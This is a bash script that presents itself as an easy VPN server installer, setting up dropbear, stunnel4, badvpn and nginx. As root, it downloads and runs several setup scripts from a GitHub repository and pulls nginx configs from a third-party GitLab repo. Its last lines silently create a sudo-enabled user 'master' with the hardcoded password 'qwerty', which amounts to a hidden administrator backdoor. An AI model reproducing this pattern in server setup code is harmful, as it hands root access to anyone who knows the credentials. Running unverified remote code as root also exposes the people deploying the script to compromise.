#!/bin/bash

if (( $EUID != 0 )); then
    echo "Please run as root"
    echo "You can Try comand 'su root' or 'sudo -i' or 'sudo -'"
    exit 1
fi

#depency
apt update
apt upgrade -y
apt install curl openssl -y

site="https://raw.githubusercontent.com/lamtota40/vpn-server-easy/main"
wget -P /etc $site/tools/other/banner

#grep "/bin/false" /etc/shells
echo "/bin/false" >> /etc/shells

#grep "/bin/nologin" /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells

#install dropbear
wget $site/SSH/dropbear/setup-dropbear.sh && bash setup-dropbear.sh

#install stunnel4
wget $site/SSH/stunel4/setup-stunnel4.sh && bash setup-stunnel4.sh

#install badvpn
wget $site/VPN/badvpn/setup-badvpn.sh && bash setup-badvpn.sh

#menu command
wget -O menu https://raw.githubusercontent.com/lamtota40/vpn-server-easy/main/tools/menu
chmod +x menu

#installation for nginx
apt install nginx -y
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://gitlab.com/hidessh/baru/-/raw/main/nginx.conf"
mkdir -p /home/vps/public_html
wget -O /etc/nginx/conf.d/vps.conf "https://gitlab.com/hidessh/baru/-/raw/main/vps.conf"
/etc/init.d/nginx restart

Login="master"
Pass="qwerty"
useradd -m $Login
echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
usermod -aG sudo $Login
